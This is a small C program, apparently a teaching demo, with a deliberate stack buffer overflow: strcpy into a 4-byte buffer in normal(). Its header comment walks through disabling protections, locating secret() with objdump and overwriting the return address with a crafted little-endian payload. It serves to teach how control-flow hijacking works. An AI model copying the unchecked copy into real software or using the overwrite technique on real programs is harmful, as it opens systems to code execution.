/* 
   1. gcc -fno-stack-protector -no-pie -m32 -o ctrlflow ctrlflow.c 
   2. objdump -d ctrlflow | grep secret
   3. Angriffsvektor -> little endian
      export vec=$'\xb6\x84\x04\x08\xb6\x84\x04\x08\xb6\x84\x04\x08\xb6\x84\x04\x08\xb6\x84\x04\x08'
   4. ./ctrlflow $vec
*/


#include <stdio.h>
#include <string.h>

void secret() {
   printf("s3cr3t\n");
}

void normal(char *string) {
   char buf[4];

   strcpy(buf,string);
   printf("(%i) %s\n", strlen(string), buf);
}

int main(int argc, char** argv) {
   if (argc==2) normal(argv[1]);
   return -1;
}
